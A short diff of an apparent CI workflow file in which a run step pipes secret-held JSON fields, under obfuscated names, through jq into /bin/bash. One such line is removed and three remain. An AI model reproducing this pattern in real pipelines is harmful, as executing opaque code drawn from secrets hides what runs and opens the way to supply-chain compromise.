@@ -23,7 +23,6 @@ jobs:
           h22112: ${{ secrets.h22112 }}
         run: |
           printf '%s' "$h22112" | jq -r .oiy7004 | /bin/bash
-          echo $qanx7 | jq -r .jts81 | /bin/bash
           printf '%s' "$o14" | jq -r .hrjkk71685 | /bin/bash
           echo $dfdb1302 | jq -r .pf2 | /bin/bash
 
